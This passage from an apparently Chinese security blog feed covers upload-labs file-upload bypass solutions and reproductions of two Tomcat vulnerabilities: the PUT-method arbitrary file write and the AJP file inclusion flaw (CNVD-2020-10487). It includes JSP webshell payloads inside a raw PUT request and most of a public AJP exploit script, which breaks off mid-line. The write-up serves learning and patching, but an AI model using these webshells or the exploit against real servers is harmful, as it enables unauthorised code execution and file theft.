class="keyword">in</span> text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20221201165300919.png" alt="image-20221201165300919"></p><h4 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h4><p>用户自定义文件名，通过源码发现用户输入的文件名后缀根据黑名单来进行限制，所以这里直接可以用大写的<code>PHP</code>进行绕过。</p><p><img src="http://image.jh2ing.com/image-20221202165316590.png" alt="image-20221202165316590"></p><p>后面在文件路径拼接中，也可以使用00截断绕过。</p><p><img src="http://image.jh2ing.com/image-20221202170027322.png" alt="image-20221202170027322"></p><h4 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h4><p>判断保存名称是否为空，如果为空就用原图片名，否则用保存名称；<code>strtolower()</code>函数将文件名全部变成小写，<code> explode()</code>函数通过<code>.</code>来将文件名分成数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">           <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>end()</code>获取数组中最后的元素，也就是后缀名来判断是否是图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>reset()</code>函数获取文件名，<code>count()</code>函数获取数组元素个数来获取后缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; test [1] =&gt; jpg )</span><br><span class="line">test.jpg</span><br></pre></td></tr></table></figure><p>，自己构造数组绕过，<code>count()</code>函数获取数组元素个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test.php.jpg</span><br><span class="line"></span><br><span class="line">Array ( [0] =&gt; test.php [1] =&gt; jpg )</span><br><span class="line">test.php.jpg</span><br></pre></td></tr></table></figure><p>把test.php保留，去除jpg，绕过<code>$file[count($file) - 1]</code>即<code>$file[count($file) - 1] </code>置空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file[0] = &quot;test.php&quot;;</span><br><span class="line">$file[2] = &quot;jpg&quot;;</span><br><span class="line"></span><br><span class="line">Array ( [0] =&gt; test.php [2] =&gt; jpg )</span><br><span class="line">test.php.</span><br></pre></td></tr></table></figure><p>通过<code>move_uploaded_file</code>函数把点去掉，<code>move_uploaded_file</code>会自动去掉末尾的<code>/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">save_name[0] = test.php/</span><br><span class="line">save_name[2] = jpg</span><br></pre></td></tr></table></figure><p>构造数据包发送上传成功。</p><p><img src="http://image.jh2ing.com/image-20221202180825799.png" alt="image-20221202180825799"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat系列漏洞</title>
      <link href="/posts/49256/"/>
      <url>/posts/49256/</url>
      
        <content type="html"><![CDATA[<h3 id="Tomcat-PUT方法任意写文件漏洞"><a href="#Tomcat-PUT方法任意写文件漏洞" class="headerlink" title="Tomcat PUT方法任意写文件漏洞"></a>Tomcat PUT方法任意写文件漏洞</h3><h4 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>Tomcat 远程执行漏洞，当存在漏洞的Tomcat运行在Windows主机上且启用了HTTP PUT请求方法，攻击者就可以通过构造的攻击请求向服务器上传包含任意代码的JSP文件，造成任意代码执行。</p><h4 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h4><p><code>Apache Tomcat 7.0.0 至 7.9.79</code></p><h4 id="3、环境搭建"><a href="#3、环境搭建" class="headerlink" title="3、环境搭建"></a>3、环境搭建</h4><p><code>docker-compose up -d</code></p><p>访问网址：<code>http://xxx:8080/</code>，即可看到Tomcat界面</p><p><img src="http://image.jh2ing.com/image-20221018000636602.png" alt="image-20221018000636602"></p><h4 id="4、漏洞复现"><a href="#4、漏洞复现" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h4><p>Tomcat 在<code>/conf/web.xml</code>文件中，Tomcat配置可写文件的选项，也就是<code>readonly</code>为<code>false</code>，默认情况下是<code>true</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>三种上传jsp文件的绕过方法</p><ul><li>文件名后面加<code>/</code></li><li>文件名后面加<code>%20</code></li><li>文件名后面加<code>::$DATA</code></li></ul><p>无回显的jsp脚本：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><p>有回显的构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PUT /test.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.73.130:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 376</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;test&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>第一种方法（文件名后面加<code>/</code>）：</p><p><img src="http://image.jh2ing.com/image-20221018002627767.png" alt="image-20221018002627767"></p><p><img src="http://image.jh2ing.com/image-20221018002730842.png" alt="image-20221018002730842"></p><p>第二种方法（文件名后面加<code>%20</code>）：</p><p><img src="http://image.jh2ing.com/image-20221018003740640.png" alt="image-20221018003740640"></p><p>第三种方法（文件名后面加<code>::$DATA</code>）：</p><p><img src="http://image.jh2ing.com/image-20221018004538357.png" alt="image-20221018004538357"></p><p><img src="http://image.jh2ing.com/image-20221018004605982.png" alt="image-20221018004605982"></p><blockquote><p><code>%20</code>和<code>::$DATA</code> 在Windows下会由于Windows文件系统的特性去掉后面的符号</p><p>返回状态码201代表上传成功</p></blockquote><h4 id="5、修复建议"><a href="#5、修复建议" class="headerlink" title="5、修复建议"></a>5、修复建议</h4><ul><li>修改web.xml下的<code>readonly</code>值</li><li>waf禁止put请求</li></ul><h3 id="Aapache-Tomcat-AJP-文件包含漏洞"><a href="#Aapache-Tomcat-AJP-文件包含漏洞" class="headerlink" title="Aapache Tomcat AJP 文件包含漏洞"></a>Aapache Tomcat AJP 文件包含漏洞</h3><h4 id="1、漏洞描述-1"><a href="#1、漏洞描述-1" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><h4 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 6</span><br><span class="line">Apache Tomcat 7 &lt; 7.0.100</span><br><span class="line">Apache Tomcat 8 &lt; 8.5.51</span><br><span class="line">Apache Tomcat 9 &lt; 9.0.31</span><br></pre></td></tr></table></figure><h4 id="3、环境搭建-1"><a href="#3、环境搭建-1" class="headerlink" title="3、环境搭建"></a>3、环境搭建</h4><p><code>docker-compose up -d</code></p><p>访问网址：<code>http://xxx:8080/</code>，即可看到Tomcat界面</p><h4 id="4、漏洞复现-1"><a href="#4、漏洞复现-1" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h4><ul><li><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">工具下载</a></li></ul><p>更改了某些报错的地方（环境python3.8+win10）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#CNVD-2020-10487  Tomcat-Ajp lfi</span><br><span class="line">#by ydhcui</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"># Some references:</span><br><span class="line"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><br><span class="line">def pack_string(s):</span><br><span class="line">if s is None:</span><br><span class="line">return struct.pack(&quot;&gt;h&quot;, -1)</span><br><span class="line">l = len(s)</span><br><span class="line">return struct.pack(&quot;&gt;H%dsb&quot; % l, l, s.encode(&#x27;utf8&#x27;), 0)</span><br><span class="line">def unpack(stream, fmt):</span><br><span class="line">size = struct.calcsize(fmt)</span><br><span class="line">buf = stream.read(size)</span><br><span class="line">return struct.unpack(fmt, buf)</span><br><span class="line">def unpack_string(stream):</span><br><span class="line">size, = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">if size == -1: # null string</span><br><span class="line">return None</span><br><span class="line">res, = unpack(stream, &quot;%ds&quot; % size)</span><br><span class="line">stream.read(1) # \0</span><br><span class="line">return res</span><br><span class="line">class NotFoundException(Exception):</span><br><span class="line">pass</span><br><span class="line">class AjpBodyRequest(object):</span><br><span class="line"># server == web server, container == servlet</span><br><span class="line">SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">MAX_REQUEST_LENGTH = 8186</span><br><span class="line">def __init__(self, data_stream, data_len, data_direction=None):</span><br><span class="line">self.data_stream = data_stream</span><br><span class="line">self.data_len = data_len</span><br><span class="line">self.data_direction = data_direction</span><br><span class="line">def serialize(self):</span><br><span class="line">data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">if len(data) == 0:</span><br><span class="line">return struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, 0x00)</span><br><span class="line">else:</span><br><span class="line">res = struct.pack(&quot;&gt;H&quot;, len(data))</span><br><span class="line">res += data</span><br><span class="line">if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">header = struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, len(res))</span><br><span class="line">else:</span><br><span class="line">header = struct.pack(&quot;&gt;bbH&quot;, 0x41, 0x42, len(res))</span><br><span class="line">return header + res</span><br><span class="line">def send_and_receive(self, socket, stream):</span><br><span class="line">while True:</span><br><span class="line">data = self.serialize()</span><br><span class="line">socket.send(data)</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line">while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:</span><br><span class="line">break</span><br><span class="line">class AjpForwardRequest(object):</span><br><span class="line">_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)</span><br><span class="line">REQUEST_METHODS = &#123;&#x27;GET&#x27;: GET, &#x27;POST&#x27;: POST, &#x27;HEAD&#x27;: HEAD, &#x27;OPTIONS&#x27;: OPTIONS, &#x27;PUT&#x27;: PUT, &#x27;DELETE&#x27;: DELETE, &#x27;TRACE&#x27;: TRACE&#125;</span><br><span class="line"># server == web server, container == servlet</span><br><span class="line">SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">COMMON_HEADERS = [&quot;SC_REQ_ACCEPT&quot;,</span><br><span class="line">&quot;SC_REQ_ACCEPT_CHARSET&quot;, &quot;SC_REQ_ACCEPT_ENCODING&quot;, &quot;SC_REQ_ACCEPT_LANGUAGE&quot;, &quot;SC_REQ_AUTHORIZATION&quot;,</span><br><span class="line">&quot;SC_REQ_CONNECTION&quot;, &quot;SC_REQ_CONTENT_TYPE&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;, &quot;SC_REQ_COOKIE&quot;, &quot;SC_REQ_COOKIE2&quot;,</span><br><span class="line">&quot;SC_REQ_HOST&quot;, &quot;SC_REQ_PRAGMA&quot;, &quot;SC_REQ_REFERER&quot;, &quot;SC_REQ_USER_AGENT&quot;</span><br><span class="line">]</span><br><span class="line">ATTRIBUTES = [&quot;context&quot;, &quot;servlet_path&quot;, &quot;remote_user&quot;, &quot;auth_type&quot;, &quot;query_string&quot;, &quot;route&quot;, &quot;ssl_cert&quot;, &quot;ssl_cipher&quot;, &quot;ssl_session&quot;, &quot;req_attribute&quot;, &quot;ssl_key_size&quot;, &quot;secret&quot;, &quot;stored_method&quot;]</span><br><span class="line">def __init__(self, data_direction=None):</span><br><span class="line">self.prefix_code = 0x02</span><br><span class="line">self.method = None</span><br><span class="line">self.protocol = None</span><br><span class="line">self.req_uri = None</span><br><span class="line">self.remote_addr = None</span><br><span class="line">self.remote_host = None</span><br><span class="line">self.server_name = None</span><br><span class="line">self.server_port = None</span><br><span class="line">self.is_ssl = None</span><br><span class="line">self.num_headers = None</span><br><span class="line">self.request_headers = None</span><br><span class="line">self.attributes = None</span><br><span class="line">self.data_direction = data_direction</span><br><span class="line">def pack_headers(self):</span><br><span class="line">self.num_headers = len(self.request_headers)</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">res = struct.pack(&quot;&gt;h&quot;, self.num_headers)</span><br><span class="line">for h_name in self.request_headers:</span><br><span class="line">if h_name.startswith(&quot;SC_REQ&quot;):</span><br><span class="line">code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1</span><br><span class="line">res += struct.pack(&quot;BB&quot;, 0xA0, code)</span><br><span class="line">else:</span><br><span class="line">res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">res += pack_string(self.request_headers[h_name])</span><br><span class="line">return res</span><br><span class="line"></span><br><span class="line">def pack_attributes(self):</span><br><span class="line">res = b&quot;&quot;</span><br><span class="line">for attr in self.attributes:</span><br><span class="line">a_name = attr[&#x27;name&#x27;]</span><br><span class="line">code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1</span><br><span class="line">res += struct.pack(&quot;b&quot;, code)</span><br><span class="line">if a_name == &quot;req_attribute&quot;:</span><br><span class="line">aa_name, a_value = attr[&#x27;value&#x27;]</span><br><span class="line">res += pack_string(aa_name)</span><br><span class="line">res += pack_string(a_value)</span><br><span class="line">else:</span><br><span class="line">res += pack_string(attr[&#x27;value&#x27;])</span><br><span class="line">res += struct.pack(&quot;B&quot;, 0xFF)</span><br><span class="line">return res</span><br><span class="line">def serialize(self):</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">res = struct.pack(&quot;bb&quot;, self.prefix_code, self.method)</span><br><span class="line">res += pack_string(self.protocol)</span><br><span class="line">res += pack_string(self.req_uri)</span><br><span class="line">res += pack_string(self.remote_addr)</span><br><span class="line">res += pack_string(self.remote_host)</span><br><span class="line">res += pack_string(self.server_name)</span><br><span class="line">res += struct.pack(&quot;&gt;h&quot;, self.server_port)</span><br><span class="line">res += struct.pack(&quot;?&quot;, self.is_ssl)</span><br><span class="line">res += self.pack_headers()</span><br><span class="line">res += self.pack_attributes()</span><br><span class="line">if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">header = struct.pack(&quot;&gt;bbh&quot;, 0x12, 0x34, len(res))</span><br><span class="line">else:</span><br><span class="line">header = struct.pack(&quot;&gt;bbh&quot;, 0x41, 0x42, len(res))</span><br><span class="line">return header + res</span><br><span class="line">def parse(self, raw_packet):</span><br><span class="line">stream = StringIO(raw_packet)</span><br><span class="line">self.magic1, self.magic2, data_len = unpack(stream, &quot;bbH&quot;)</span><br><span class="line">self.prefix_code, self.method = unpack(stream, &quot;bb&quot;)</span><br><span class="line">self.protocol = unpack_string(stream)</span><br><span class="line">self.req_uri = unpack_string(stream)</span><br><span class="line">self.remote_addr = unpack_string(stream)</span><br><span class="line">self.remote_host = unpack_string(stream)</span><br><span class="line">self.server_name = unpack_string(stream)</span><br><span class="line">self.server_port = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">self.is_ssl = unpack(stream, &quot;?&quot;)</span><br><span class="line">self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">self.request_headers = &#123;&#125;</span><br><span class="line">for i in range(self.num_headers):</span><br><span class="line">code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">if code &gt; 0xA000:</span><br><span class="line">h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]</span><br><span class="line">else:</span><br><span class="line">h_name = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">stream.read(1) # \0</span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">self.request_headers[h_name] = h_value</span><br><span class="line">def send_and_receive(self, socket, stream, save_cookies=False):</span><br><span class="line">res = []</span><br><span class="line">i = socket.sendall(self.serialize())</span><br><span class="line">if self.method == AjpForwardRequest.POST:</span><br><span class="line">return res</span><br><span class="line"></span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line">assert 